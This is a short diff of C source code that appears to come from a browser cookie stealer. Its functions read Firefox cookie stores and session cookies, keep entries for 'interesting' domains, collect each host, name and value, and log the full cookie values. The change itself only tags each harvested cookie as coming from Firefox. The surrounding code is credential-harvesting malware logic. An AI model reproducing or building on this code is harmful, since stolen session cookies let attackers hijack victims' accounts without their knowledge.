@@ -68,7 +68,7 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 
 	NormalizeDomainA(host);
 	if (host && name && value && IsInterestingDomainA(host))
-		AddCookieA(host, name, value);
+		AddCookieA(host, name, value, COOKIE_FROM_FIRE_FOX);
 
 	SAFE_FREE(host);
 	SAFE_FREE(name);
@@ -182,7 +182,7 @@ int DumpSessionCookies(WCHAR *profilePath)
 
 							NormalizeDomainW(host);
 							if (host && name && cvalue && IsInterestingDomainW(host)){
-								AddCookieW(host, name, cvalue);
+								AddCookieW(host, name, cvalue, COOKIE_FROM_FIRE_FOX);
 								//add
 								wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
 								swprintf(szLogW, L"FF AddCookieW host:%s,name:%s,value:%s", host, name, cvalue);
